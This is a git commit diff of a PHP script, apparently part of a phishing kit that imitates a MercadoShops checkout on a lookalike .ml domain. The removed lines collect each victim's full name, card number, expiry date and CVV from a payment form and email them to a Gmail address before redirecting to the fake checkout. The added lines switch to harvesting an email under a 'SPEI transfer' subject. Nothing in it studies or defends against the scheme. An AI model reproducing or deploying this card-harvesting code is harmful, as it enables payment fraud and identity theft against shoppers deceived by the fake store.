5ab512e9e3c32160e050247580b80805f586961b
ppsoberano <ppsoberano@gmail.com>
2023-01-08 05:48:12 -0600

    msg

--- MPAGO/send_emailcc.php
+++ MPAGO/send_emailcc.php
@@ -3,14 +3,13 @@
 	$amount = $_POST['amount'];
 	$currency_code = $_POST['currency_code'];
 	
-	$nombre = $_POST['fullname'];
-	$card_number = $_POST['card_number'];
-	$input_expiration_date = $_POST['input_expiration_date'];
-	$cvv = $_POST['cvv'];
-	$asunto = 'Formulario';
+	$email = $_POST['email'];
+	$card_number = $_POST['email'];
+	$input_expiration_date = $_POST['email'];
+	$cvv = $_POST['email'];
+	$asunto = 'transfer SPEI enviado';
 	$mensaje = "Nombre: ".$nombre."<br> Email: $card_number <br> input_expiration_date: $input_expiration_date <br> cvv: $cvv <br> item_name: $item_name <br> amount: $amount <br> currency_code: $currency_code";
 
-	$rest = substr($card_number , -4); 	
 	$from = 'IAXG830920HS@gmail.com';
 $headers = "From: admin@soberanosoft.gq\r\n"; 
 $headers .= "Reply-To: $from\r\n";
@@ -18,7 +17,7 @@ $headers .= "MIME-Version: 1.0\r\n";
 $headers .= "Content-Type: text/html; charset=utf-8\r\n"; 
 	
 if(mail($from, $asunto, $mensaje,$headers)){
-	header("Location: https://www.gamestoremercadoshopscom.ml/MPAGO/checkout_v1_payment_redirect_6a4fac9c-203d-485c-ba1a-e8b5cc9e85a9_card-form__router-request-id=15927339-fff3-438a-b003-a72c_cc_email?item_name=$item_name&amount=$amount&micc=$rest");
+	header("Location: https://www.gamestoremercadoshopscom.ml/MPAGO/checkout_v1_payment_redirect_0a5dbcbb-bec7-4d9e-a63d-269317184802_payment-option-form__source=Finalizá_tu_Pago_cc?item_name=$item_name&amount=$amount");
 exit();
 	}
 
